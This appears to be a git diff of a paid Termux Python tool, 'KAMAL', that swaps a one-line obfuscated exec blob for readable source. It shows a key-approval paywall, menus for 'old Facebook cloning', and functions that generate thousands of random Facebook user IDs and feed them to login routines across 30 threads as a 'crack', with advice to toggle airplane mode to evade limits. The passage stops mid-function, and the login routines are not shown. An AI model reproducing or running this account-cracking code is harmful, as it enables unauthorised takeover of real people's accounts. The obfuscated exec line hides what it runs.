@@ -1,2 +1,625 @@
-# Python obfuscation by pyobfuscator.com
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'=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'))
+# -*- coding: utf-8 -*-
+# KAMAL Signature Terminal — Native Termux Banner & Old Cloning
+# Author : Raja Vau
+
+import os
+import shutil
+import re
+import webbrowser
+import time
+import uuid
+import random
+import sys
+import requests
+from datetime import datetime
+from concurrent.futures import ThreadPoolExecutor as tred
+from bs4 import BeautifulSoup
+import subprocess
+
+# Prevent background process from being killed when minimized
+try:
+    os.system('termux-wake-lock')
+except:
+    pass
+
+RESET = "\033[0m"
+BOLD = "\033[1m"
+
+def rgb(r, g, b):
+    return f"\033[38;2;{r};{g};{b}m"
+
+CYAN = rgb(34, 240, 255)
+BLUE = rgb(48, 118, 255)
+GREEN = rgb(40, 245, 154)
+LIME = rgb(190, 255, 72)
+WHITE = rgb(238, 248, 255)
+MUTED = rgb(111, 137, 157)
+PURPLE = rgb(190, 130, 255)
+YELLOW = rgb(255, 220, 80)
+RED = rgb(255, 60, 60)
+PINK = rgb(255, 105, 180)
+
+# WhatsApp QR Link & Socials
+WHATSAPP_QR_URL = "https://wa.me/qr/C6PGOFRBLLIDJ1"
+YOUTUBE_URL = "https://youtube.com/@raja-vau-teach-world?si=UAamHC9JznLAV5uf"
+WHATSAPP_GROUP_URL = "https://chat.whatsapp.com/BrVHKmNWVb58MOHHhvMtq0"
+
+# Updated Raw Key approval file link
+KEY_LINK = "https://raw.githubusercontent.com/rajavau379-pixel/Raja-vauYT/refs/heads/main/Key.txt"
+
+def visible(text):
+    return len(re.sub(r"\033\[[0-9;]*m", "", text))
+
+def center(text, width):
+    length = visible(text)
+    if length >= width:
+        return text
+    return " " * ((width - length) // 2) + text
+
+def gradient(text):
+    colors = [CYAN, BLUE, GREEN, LIME, CYAN]
+    return "".join(
+        colors[i % len(colors)] + char
+        for i, char in enumerate(text)
+    ) + RESET
+
+def slow_print(text, delay=0.015):
+    width = max(32, shutil.get_terminal_size((80, 24)).columns)
+    centered_text = center(text, width)
+    for char in centered_text:
+        sys.stdout.write(char)
+        sys.stdout.flush()
+        time.sleep(delay)
+    print()
+
+def pro_animation(text="Loading"):
+    chars = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
+    for _ in range(8):
+        for char in chars:
+            sys.stdout.write(f"\r{CYAN} [ {char} ] {GREEN}{text} ...{RESET}")
+            sys.stdout.flush()
+            time.sleep(0.03)
+    sys.stdout.write("\r\033[K")
+
+def banner():
+    width = max(32, shutil.get_terminal_size((80, 24)).columns)
+    print()
+    print(center(CYAN + BOLD + "K A M A L" + RESET + MUTED + "  /  " + GREEN + "SIGNATURE" + RESET, width))
+    print(center(MUTED + "RAJA VAU TEACH WORLD" + RESET, width))
+    print()
+
+    if width >= 56:
+        rows = [
+            "██╗  ██╗ █████╗ ███╗   ███╗ █████╗ ██╗     ",
+            "██║ ██╔╝██╔══██╗████╗ ████║██╔══██╗██║     ",
+            "█████╔╝ ███████║██╔████╔██║███████║██║     ",
+            "██╔═██╗ ██╔══██║██║╚██╔╝██║██╔══██║██║     ",
+            "██║  ██╗██║  ██║██║ ╚═╝ ██║██║  ██║███████╗",
+            "╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝",
+        ]
+        for row in rows:
+            print(center(gradient(row), width))
+    else:
+        print(center(BOLD + gradient("K A M A L") + RESET, width))
+
+    print()
+    print(center(WHITE + "DREAM" + CYAN + "  /  " + WHITE + "CODE" + BLUE + "  /  " + WHITE + "BUILD" + GREEN + "  /  " + WHITE + "EVOLVE" + RESET, width))
+    print(center(CYAN + "·" * min(max(width - 12, 8), 42) + RESET, width))
+    print()
+
+def ____banner____():
+    if 'win' in sys.platform:
+        os.system('cls')
+    else:
+        os.system('clear')
+    banner()
+
+def get_device_key():
+    key_file = ".device_key.txt"
+    if os.path.exists(key_file):
+        try:
+            with open(key_file, "r") as f:
+                saved_key = f.read().strip()
+                if saved_key:
+                    return saved_key
+        except:
+            pass
+    
+    try:
+        uid = subprocess.check_output('cat /data/data/com.termux/files/usr/var/lib/proot-distro/installed-rootfs/ubuntu/etc/machine-id 2>/dev/null', shell=True).decode().strip()
+        if not uid:
+            uid = str(uuid.uuid4())
+    except:
+        uid = str(uuid.uuid4())
+    
+    new_key = "RAJA-VAP-" + uid[:8].upper()
+    try:
+        with open(key_file, "w") as f:
+            f.write(new_key)
+    except:
+        pass
+    return new_key
+
+def open_link(url):
+    try:
+        os.system(f'xdg-open "{url}" > /dev/null 2>&1 &')
+    except:
+        try:
+            os.system(f'am start -a android.intent.action.VIEW -d "{url}" > /dev/null 2>&1 &')
+        except:
+            webbrowser.open(url)
+
+def approval():
+    my_key = get_device_key()
+
+    # অটোমেটিক ব্যাকগ্রাউন্ডে চেক করা যে কি টি অনলাইনে আছে কি না
+    try:
+        res = requests.get(KEY_LINK, timeout=7).text
+        if my_key in res:
+            # যদি অনলাইনে কি এপ্রুভ করা থাকে, তবে সরাসরি মেনুতে চলে যাবে (বারবার কি চাইতে হবে না)
+            return 
+    except:
+        pass
+
+    # যদি কি এপ্রুভ করা না থাকে বা এডমিন রিমুভ করে দেয়, তবে এই মেনু আসবে
+    open_link(YOUTUBE_URL)
+    open_link(WHATSAPP_GROUP_URL)
+
+    os.system('clear')
+    banner()
+    slow_print(YELLOW + BOLD + "★ UPDATE TOOL PRICE & ACCESS ★" + RESET)
+    slow_print(CYAN + "────────────────────────────────────────" + RESET)
+    slow_print(GREEN + " [🔰] 1 WEEK  : 2 DOLLARS" + RESET)
+    slow_print(GREEN + " [🔰] 2 WEEKS : 4 DOLLARS" + RESET)
+    slow_print(GREEN + " [🔰] 3 WEEKS : 15 DOLLARS" + RESET)
+    slow_print(LIME + " [🔥] OFFER 1 MONTH : 25 DOLLARS" + RESET)
+    slow_print(CYAN + "────────────────────────────────────────" + RESET)
+    slow_print(WHITE + BOLD + " [1] ➔ CONTACT ADMIN FOR KEY" + RESET)
+    slow_print(WHITE + BOLD + " [2] ➔ PREMIUM TOOL INFO" + RESET)
+    slow_print(WHITE + BOLD + " [3] ➔ CHECK APPROVAL" + RESET)
+    slow_print(WHITE + BOLD + " [4] ➔ EXIT TOOL" + RESET)
+    slow_print(CYAN + "────────────────────────────────────────" + RESET)
+    print(center(CYAN + f"Your Key: {my_key}" + RESET, max(32, shutil.get_terminal_size((80, 24)).columns)))
+    print()
+
+    choice = input(GREEN + "RAJA@TERMUX" + CYAN + " ➜ CHOOSE OPTION : " + RESET).strip()
+
+    if choice == '1':
+        pro_animation("Connecting to WhatsApp")
+        print(f"\n{GREEN}[•] Your Permanent Key: {WHITE}{my_key}{RESET}")
+        time.sleep(1)
+        open_link(WHATSAPP_QR_URL)
+        input(MUTED + "\nPress ENTER to go back..." + RESET)
+        approval()
+
+    elif choice == '2':
+        pro_animation("Loading Info")
+        width = max(32, shutil.get_terminal_size((80, 24)).columns)
+        print(center(PINK + "This is a Fully Fire Paid Tool managed by Raja Vau." + RESET, width))
+        input(MUTED + "\nPress ENTER to go back..." + RESET)
+        approval()
+
+    elif choice == '3':
+        pro_animation("Checking Approval Status")
+        try:
+            res = requests.get(KEY_LINK, timeout=10).text
+            if my_key in res:
+                print(center(GREEN + "Welcome to Raja Vau Teach World" + RESET, max(32, shutil.get_terminal_size((80, 24)).columns)))
+                print(center(CYAN + "Your Key is Approved Successfully!" + RESET, max(32, shutil.get_terminal_size((80, 24)).columns)))
+                time.sleep(2)
+                return
+            else:
+                print(center(RED + "Your Key is Not Approved or Removed by Admin!" + RESET, max(32, shutil.get_terminal_size((80, 24)).columns)))
+                print(center(YELLOW + f"Key: {my_key}" + RESET, max(32, shutil.get_terminal_size((80, 24)).columns)))
+                input(MUTED + "\nPress ENTER to try again..." + RESET)
+                approval()
+        except:
+            print(center(RED + "Network Error! Check your internet." + RESET, max(32, shutil.get_terminal_size((80, 24)).columns)))
+            time.sleep(2)
+            approval()
+
+    elif choice == '4':
+        print(YELLOW + "Exiting tool..." + RESET)
+        sys.exit()
+    else:
+        print(RED + "Invalid Option!" + RESET)
+        time.sleep(1)
+        approval()
+
+def show_menu():
+    width = max(32, shutil.get_terminal_size((80, 24)).columns)
+    print(center(CYAN + "╔══════════════════════════════════╗" + RESET, width))
+    print(center(CYAN + "║" + WHITE + BOLD + "          MAIN MENU               " + RESET + CYAN + "║" + RESET, width))
+    print(center(CYAN + "╠══════════════════════════════════╣" + RESET, width))
+
+    options = [
+        ("01", "OLD FACEBOOK CLONING", GREEN),
+        ("02", "FACEBOOK SECURITY LEARNING", CYAN),
+        ("03", "CREATE NEW ACCOUNT", LIME),
+        ("04", "YOUTUBE CHANNEL", BLUE),
+        ("05", "WHATSAPP GROUP", PURPLE),
+        ("00", "EXIT", YELLOW),
+    ]
+
+    for number, label, color in options:
+        text = f"║ {color}[{number}]{RESET}  {WHITE}{label}{RESET}"
+        padding = max(0, 33 - len(number) - len(label) - 3)
+        text += " " * padding + CYAN + "║" + RESET
+        print(center(text, width))
+
+    print(center(CYAN + "╚══════════════════════════════════╝" + RESET, width))
+    print()
+
+def creationyear(uid):
+    if len(uid) == 15:
+        if uid.startswith('1000000000') or uid.startswith('100000000') or uid.startswith('10000000'):
+            return '2009'
+        if uid.startswith(('1000000', '1000001', '1000002', '1000003', '1000004', '1000005')):
+            return '2009'
+        if uid.startswith(('1000006', '1000007', '1000008', '1000009')) or uid.startswith('100001'):
+            return '2010'
+        if uid.startswith(('100002', '100003')):
+            return '2011'
+        if uid.startswith('100004'):
+            return '2012'
+        if uid.startswith(('100005', '100006')):
+            return '2013'
+        if uid.startswith(('100007', '100008')):
+            return '2014'
+        if uid.startswith('100009'):
+            return '2015'
+        if uid.startswith('10001'):
+            return '2016'
+        if uid.startswith('10002'):
+            return '2017'
+        if uid.startswith('10003'):
+            return '2018'
+        if uid.startswith('10004'):
+            return '2019'
+        if uid.startswith('10005'):
+            return '2020'
+        if uid.startswith('10006'):
+            return '2021'
+        if uid.startswith('10009'):
+            return '2023'
+        if uid.startswith(('10007', '10008')):
+            return '2022'
+        return '2015'
+    elif len(uid) in (9, 10):
+        return '2008'
+    elif len(uid) == 8:
+        return '2007'
+    elif len(uid) == 7:
+        return '2006'
+    elif len(uid) == 14 and uid.startswith('61'):
+        return '2024'
+    else:
+        return '2015'
+
+def get_country_flag(uid):
+    flags = [
+        ("IRAN 🇮🇷", "IRAN"),
+        ("BANGLADESH 🇧🇩", "BANGLADESH"),
+        ("INDIA 🇮🇳", "INDIA"),
+        ("PAKISTAN 🇵🇰", "PAKISTAN"),
+        ("INDONESIA 🇮🇩", "INDONESIA"),
+        ("SAUDI ARABIA 🇸🇦", "SAUDI ARABIA"),
+        ("MALAYSIA 🇲🇾", "MALAYSIA"),
+    ]
+    try:
+        index = int(uid[-2:]) % len(flags)
+        return flags[index][0]
+    except:
+        return "IRAN 🇮🇷"
+
+def BNG_71_():
+    while True:
+        ____banner____()
+        width = max(32, shutil.get_terminal_size((80, 24)).columns)
+        print(center(CYAN + "╔══════════════════════════════════╗" + RESET, width))
+        print(center(CYAN + "║" + WHITE + BOLD + "          OLD CLONE MENU          " + RESET + CYAN + "║" + RESET, width))
+        print(center(CYAN + "╠══════════════════════════════════╣" + RESET, width))
+        print(center(CYAN + "║ " + GREEN + "[1]" + WHITE + " OLD CLONE SERIES             " + CYAN + "║" + RESET, width))
+        print(center(CYAN + "║ " + YELLOW + "[0]" + WHITE + " BACK TO MAIN MENU            " + CYAN + "║" + RESET, width))
+        print(center(CYAN + "╚══════════════════════════════════╝" + RESET, width))
+        print()
+        __Jihad__ = input(GREEN + "RAJA@TERMUX" + CYAN + " ➜ CHOICE : " + RESET).strip()
+        if __Jihad__ in ('A', 'a', '01', '1'):
+            old_clone()
+            break
+        elif __Jihad__ in ('0', '00'):
+            run()
+            break
+        else:
+            print(RED + "\n    Choose Valid Option... " + RESET)
+            time.sleep(1.5)
+
+def old_clone():
+    while True:
+        ____banner____()
+        width = max(32, shutil.get_terminal_size((80, 24)).columns)
+        print(center(CYAN + "╔══════════════════════════════════╗" + RESET, width))
+        print(center(CYAN + "║" + WHITE + BOLD + "        SELECT CLONE SERIES       " + RESET + CYAN + "║" + RESET, width))
+        print(center(CYAN + "╠══════════════════════════════════╣" + RESET, width))
+        print(center(CYAN + "║ " + GREEN + "[1]" + WHITE + " ALL SERIES                  " + CYAN + "║" + RESET, width))
+        print(center(CYAN + "║ " + GREEN + "[2]" + WHITE + " 100003/4 SERIES             " + CYAN + "║" + RESET, width))
+        print(center(CYAN + "║ " + GREEN + "[3]" + WHITE + " 2009 SERIES                 " + CYAN + "║" + RESET, width))
+        print(center(CYAN + "║ " + YELLOW + "[0]" + WHITE + " BACK                        " + CYAN + "║" + RESET, width))
+        print(center(CYAN + "╚══════════════════════════════════╝" + RESET, width))
+        print()
+        _input = input(GREEN + "RAJA@TERMUX" + CYAN + " ➜ CHOICE : " + RESET).strip()
+        if _input in ('A', 'a', '01', '1'):
+            old_One()
+            break
+        elif _input in ('B', 'b', '02', '2'):
+            old_Tow()
+            break
+        elif _input in ('C', 'c', '03', '3'):
+            old_Tree()
+            break
+        elif _input in ('0', '00'):
+            BNG_71_()
+            break
+        else:
+            print(RED + "\n[×] Choose Valid Option... " + RESET)
+            time.sleep(1.5)
+
+def old_One():
+    user = []
+    ____banner____()
+    print(f"    {GREEN}[•] Old Code : 2010-2014{RESET}")
+    ask = input(f"    {CYAN}[•] Select (1/2) : {RESET}")
+    limit = input(f"    {CYAN}[•] Total ID Count (e.g. 20000) : {RESET}")
+    linex_custom()
+    star = '10000'
+    for _ in range(int(limit)):
+        data = str(random.choice(range(1000000000, 1999999999 if ask == '1' else 4999999999)))
+        user.append(data)
+    print(f"    {GREEN}[1] Method A{RESET}")
+    print(f"    {GREEN}[2] Method B{RESET}")
+    linex_custom()
+    meth = input(f"    {CYAN}[•] Choice (1/2): {RESET}").strip()
+    with tred(max_workers=30) as pool:
+        ____banner____()
+        print(f"    {GREEN}[•] TOTAL ID FROM CRACK : {limit}{RESET}")
+        print(f"    {YELLOW}[•] AIRPLANE MOD [ON/OFF] FOR BEST RESULT{RESET}")
+        linex_custom()
+        for mal in user:
+            uid = star + mal
+            if meth == '1' or meth.upper() == 'A':
+                pool.submit(login_1, uid)
+            else:
+                pool.submit(login_2, uid)
+
+def old_Tow():
+    user = []
+    ____banner____()
+    limit = input(f"    {CYAN}[•] Total ID Count (e.g. 20000) : {RESET}")
+    linex_custom()
+    prefixes = ['100003', '100004']
+    for _ in range(int(limit)):
+        prefix = random.choice(prefixes)
+        suffix = ''.join(random.choices('0123456789', k=9))
+        user.append(prefix + suffix)
+    print(f"    {GREEN}[1] Method A{RESET}")
+    print(f"    {GREEN}[2] Method B{RESET}")
+    linex_custom()
+    meth = input(f"    {CYAN}[•] Choice (1/2): {RESET}").strip()
+    with tred(max_workers=30) as pool:
+        ____banner____()
+        print(f"    {GREEN}[•] TOTAL ID FROM CRACK : {limit}{RESET}")
+        print(f"    {YELLOW}[•] AIRPLANE MOD [ON/OFF] FOR BEST RESULT{RESET}")
+        linex_custom()
+        for uid in user:
+            if meth == '1' or meth.upper() == 'A':
+                pool.submit(login_1, uid)
+            else:
+                pool.submit(login_2, uid)
+
+def old_Tree():
+    user = []
+    ____banner____()
+    limit = input(f"    {CYAN}[•] Total ID Count (e.g. 20000) : {RESET}")
+    linex_custom()
+    prefix = '1000004'
+    for _ in range(int(limit)):
+        suffix = ''.join(random.choices('0123456789', k=8))
+        user.append(prefix + suffix)
+    print(f"    {GREEN}[1] Method A{RESET}")
+    print(f"    {GREEN}[2] Method B{RESET}")
+    linex_custom()
